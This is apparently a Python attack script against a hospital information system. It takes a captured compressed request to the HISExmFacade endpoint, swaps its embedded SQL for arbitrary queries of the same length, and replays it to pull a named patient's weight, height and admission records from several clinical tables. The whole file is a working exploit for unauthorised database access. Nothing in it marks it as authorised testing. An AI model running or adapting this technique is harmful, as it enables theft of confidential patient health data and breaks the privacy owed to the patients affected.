from his_client_final import HISClient
import json, sys, re, zlib, os, requests

if sys.platform == "win32":
    sys.stdout.reconfigure(encoding='utf-8')

c = HISClient()
target_patient = "003189572E"

def execute_sql_inner(sql_query):
    template_path = "HISExmFacade_payload_0.bin"
    if not os.path.exists(template_path): return f"Error: {template_path} not found"
    with open(template_path, "rb") as f:
        compressed_template = f.read()
    try: decompressed = zlib.decompress(compressed_template)
    except: decompressed = compressed_template
    original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
    target_len = len(original_sql_bytes)
    if len(sql_query) > target_len:
        return f"Error: SQL too long {len(sql_query)} > {target_len}"
    padded_sql = sql_query.ljust(target_len)
    patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
    final_payload = zlib.compress(patched_payload)
    resp = requests.post(f"{c.base_url}/HISExmFacade", data=final_payload, headers=c.headers)
    if resp.status_code == 200:
        dec = zlib.decompress(resp.content)
        return dec.decode('utf-8', errors='ignore')
    return f"Error: Status {resp.status_code}"

print(f"[*] Investigating vitals for patient {target_patient}...")

# 1. Check CPOE.OR_SIGN_IN
print("\n--- Table: CPOE.OR_SIGN_IN ---")
q_or = f"SELECT * FROM CPOE.OR_SIGN_IN WHERE HHISTNUM = '{target_patient}'"
res_or = execute_sql_inner(q_or)
if res_or and "<NewDataSet>" in res_or:
    rows = re.findall(r'<DRMODIFY.*?>(.*?)</DRMODIFY>', res_or, re.DOTALL)
    print(f"Found {len(rows)} rows.")
    for i, row in enumerate(rows):
        w = re.search(r'<WEIGHT>(.*?)</WEIGHT>', row)
        h = re.search(r'<HEIGHT>(.*?)</HEIGHT>', row)
        dt = re.search(r'<CREATEDATETIME>(.*?)</CREATEDATETIME>', row)
        print(f"  Row {i}: DT: {dt.group(1) if dt else 'N/A'} | WEIGHT: {w.group(1) if w else 'N/A'} | HEIGHT: {h.group(1) if h else 'N/A'}")
else:
    print(f"No data in CPOE.OR_SIGN_IN or error: {res_or}")

# 2. Check OPDUSR.VITALSIGNUPLOAD
print("\n--- Table: OPDUSR.VITALSIGNUPLOAD ---")
q_up = f"SELECT * FROM OPDUSR.VITALSIGNUPLOAD WHERE HHISNUM = '{target_patient}' ORDER BY OCCURDATE DESC"
res_up = execute_sql_inner(q_up)
if res_up and "<NewDataSet>" in res_up:
    rows = re.findall(r'<DRMODIFY.*?>(.*?)</DRMODIFY>', res_up, re.DOTALL)
    print(f"Found {len(rows)} rows.")
    etypes = set()
    for row in rows:
        etype_m = re.search(r'<EVENT_TYPE>(.*?)</EVENT_TYPE>', row)
        if etype_m:
            etypes.add(etype_m.group(1).strip())
    print(f"Event Types found: {list(etypes)}")
    
    # List some values
    for row in rows:
        etype_m = re.search(r'<EVENT_TYPE>(.*?)</EVENT_TYPE>', row)
        nval_m = re.search(r'<NVALUE1>(.*?)</NVALUE1>', row)
        date_m = re.search(r'<OCCURDATE>(.*?)</OCCURDATE>', row)
        if etype_m and nval_m:
            etype = etype_m.group(1).strip()
            val = nval_m.group(1).strip()
            dt = date_m.group(1).strip() if date_m else "N/A"
            if etype in ['HEIGHT', 'WEIGHT', 'BODY WEIGHT', 'BODY HEIGHT', 'W', 'H']:
                print(f"  {dt}: {etype} = {val}")
else:
    print(f"No data in OPDUSR.VITALSIGNUPLOAD or error: {res_up}")

# 3. Check SYSTEM.PAT_ADM_CASE
print("\n--- Table: SYSTEM.PAT_ADM_CASE ---")
q_case = f"SELECT * FROM SYSTEM.PAT_ADM_CASE WHERE HHISNUM = '{target_patient}'"
res_case = execute_sql_inner(q_case)
if res_case and "<NewDataSet>" in res_case:
    rows = re.findall(r'<DRMODIFY.*?>(.*?)</DRMODIFY>', res_case, re.DOTALL)
    print(f"Found {len(rows)} rows.")
    for row in rows:
        w = re.search(r'<WEIGHT>(.*?)</WEIGHT>', row)
        h = re.search(r'<HEIGHT>(.*?)</HEIGHT>', row)
        adm_dt = re.search(r'<HADMDT>(.*?)</HADMDT>', row)
        print(f"  HADMDT: {adm_dt.group(1) if adm_dt else 'N/A'} | WEIGHT: {w.group(1) if w else 'N/A'} | HEIGHT: {h.group(1) if h else 'N/A'}")
else:
    print(f"No data in SYSTEM.PAT_ADM_CASE or error: {res_case}")
